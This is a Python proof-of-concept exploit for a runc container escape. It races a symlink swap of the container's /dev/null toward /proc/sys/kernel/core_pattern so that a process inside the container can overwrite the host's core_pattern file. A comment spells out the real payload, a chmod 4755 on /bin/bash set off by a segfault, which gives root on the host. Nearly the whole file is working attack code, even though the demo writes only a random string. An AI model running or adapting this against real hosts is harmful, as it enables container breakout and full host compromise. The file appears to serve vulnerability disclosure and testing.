import os
import stat
import pathlib
import itertools
import shutil
import json
import random
import subprocess
import threading
import time
import string
import ctypes


def random_string(length: int) -> str:
    symbols = string.ascii_letters + string.digits
    return "".join(random.choices(symbols, k=length))


# In a real attack, HANDLER_COMMAND would be something like "|/bin/chmod 4755 /bin/bash"
# which would be triggered by causing a segmentation fault (e.g., with `kill -SEGV $$`).
# When a process crashes, the kernel executes the core_pattern handler as root.
# For this PoC, we use a random string to prove write access without modifying the system.
HANDLER_COMMAND = random_string(64)


OCI_CONFIG = {
    "ociVersion": "1.2.1",
    "process": {
        "terminal": False,
        "user": { "uid": 0, "gid": 0 },
        "args": [ "/bin/sh", "-c", "sleep 30" ], # Keep container alive for a bit.
        "env": [ "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" ],
        "cwd": "/",
        "noNewPrivileges": True, # Standard container security - doesn't prevent this exploit.
    },
    "root": { "path": "rootfs", "readonly": True },
    "mounts": [
        { "destination": "/proc", "type": "proc", "source": "proc" },
    ],
    "linux": {
        "namespaces": [
            { "type": "pid" },
            { "type": "network" },
            { "type": "ipc" },
            { "type": "uts" },
            { "type": "mount" },
            { "type": "cgroup" },
        ],
        "maskedPaths": [
            "/proc/acpi",
            "/proc/asound",
            "/proc/kcore",
            "/proc/keys",
            "/proc/latency_stats",
            "/proc/timer_list",
            "/proc/timer_stats",
            "/proc/sched_debug",
            "/sys/firmware",
            "/proc/scsi",
            "/proc/sys/kernel/core_pattern"
        ]
    }
}


def prepare_bundle() -> str:
    bundle_dir = pathlib.Path("bundle")
    rootfs_dir = bundle_dir / "rootfs"

    if bundle_dir.exists():
        shutil.rmtree(bundle_dir)

    (rootfs_dir / "bin").mkdir(parents=True, exist_ok=True)
    (rootfs_dir / "dev").mkdir(parents=True, exist_ok=True)
    (rootfs_dir / "proc").mkdir(parents=True, exist_ok=True)

    for binary in ["sh", "echo", "sleep"]:
        host_path = pathlib.Path("/bin") / binary
        shutil.copy2(host_path, rootfs_dir / "bin" / binary)

    remove_null_device(str(rootfs_dir))
    mock_null_device(str(rootfs_dir))

    config_path = bundle_dir / "config.json"
    with open(config_path, "w+") as f:
        json.dump(OCI_CONFIG, f, indent=2)

    return str(bundle_dir.absolute())


def run_container(bundle_dir: str) -> str:
    name = random_string(32)
    subprocess.run(["runc", "run", "--detach", "--bundle", bundle_dir, name])
    return name


def trigger_race_condition(rootfs: str, seconds: float = 10.0) -> None:
    end = time.monotonic() + seconds
    
    while time.monotonic() < end:
        remove_null_device(rootfs)
        link_null_device(rootfs)
        time.sleep(0.0005) # 0.5 ms
        
        remove_null_device(rootfs)
        mock_null_device(rootfs)
        time.sleep(0.005) # 5 ms


def remove_null_device(rootfs: str) -> None:
    pathlib.Path(f"{rootfs}/dev/null").unlink(missing_ok=True)


def link_null_device(rootfs: str) -> None:
    os.symlink("/proc/sys/kernel/core_pattern", f"{rootfs}/dev/null")


def mock_null_device(rootfs: str) -> None:
    shutil.copy2("/dev/null", f"{rootfs}/dev/null")


def main() -> None:
    bundle_dir = prepare_bundle()
    rootfs = pathlib.Path(bundle_dir) / "rootfs"
    
    thread = threading.Thread(target=trigger_race_condition, args=(rootfs, 20))
    thread.start()
    time.sleep(0.1) # Let race start.
    
    name = run_container(bundle_dir)
    print(f"Launched container: {name}")
    
    time.sleep(2) # Wait for container to stabilize.
    
    # Execute exploit in running container.
    subprocess.run([
        "runc", "exec", name, 
        "/bin/sh", "-c", 
        f"echo {HANDLER_COMMAND} > /proc/sys/kernel/core_pattern",
    ])
    
    thread.join()

    with open("/proc/sys/kernel/core_pattern") as f:
        if f.read().strip() != HANDLER_COMMAND:
            print("Exploit did not succeed. Try again.")
            return

    print(f"Exploit succeeded!")


if __name__ == "__main__":
    main()
